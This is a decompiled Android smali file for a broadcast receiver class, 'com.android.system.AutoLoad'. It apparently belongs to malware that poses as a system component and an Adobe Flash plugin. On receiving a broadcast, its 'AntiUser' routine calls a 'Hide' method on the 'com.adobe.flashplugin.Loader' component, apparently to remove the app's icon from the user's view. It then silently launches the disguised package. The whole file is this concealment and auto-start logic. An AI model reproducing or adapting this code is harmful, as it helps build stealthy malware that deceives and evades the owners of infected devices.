.class public Lcom/android/system/AutoLoad;
.super Landroid/content/BroadcastReceiver;
.source "AutoLoad.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/system/AutoLoad$AvThere;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 12
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public AntiUser(Landroid/content/Context;)V
    .locals 5
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 43
    new-instance v0, Landroid/content/ComponentName;

    const-class v4, Lcom/adobe/flashplugin/Loader;

    invoke-direct {v0, p1, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 44
    .local v0, "P":Landroid/content/ComponentName;
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 45
    .local v2, "p":Landroid/content/pm/PackageManager;
    const/4 v1, 0x1

    .line 46
    .local v1, "cz":I
    const/4 v3, 0x1

    .line 47
    .local v3, "z":I
    new-instance v4, Lcom/android/system/AutoLoad$AvThere;

    invoke-direct {v4, p0}, Lcom/android/system/AutoLoad$AvThere;-><init>(Lcom/android/system/AutoLoad;)V

    invoke-virtual {v4, v2, v0, v1, v3}, Lcom/android/system/AutoLoad$AvThere;->Hide(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V

    .line 49
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 20
    invoke-virtual {p0, p1}, Lcom/android/system/AutoLoad;->AntiUser(Landroid/content/Context;)V

    .line 23
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 25
    .local v1, "manager":Landroid/content/pm/PackageManager;
    :try_start_0
    const-string v2, "com.adobe.flashplugin"

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 26
    .local v0, "i":Landroid/content/Intent;
    if-nez v0, :cond_0

    .line 27
    new-instance v2, Landroid/content/pm/PackageManager$NameNotFoundException;

    invoke-direct {v2}, Landroid/content/pm/PackageManager$NameNotFoundException;-><init>()V

    throw v2

    .line 30
    .end local v0    # "i":Landroid/content/Intent;
    :catch_0
    move-exception v2

    .line 36
    :goto_0
    return-void

    .line 28
    .restart local v0    # "i":Landroid/content/Intent;
    :cond_0
    const-string v2, "android.intent.category.LAUNCHER"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 29
    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0
.end method
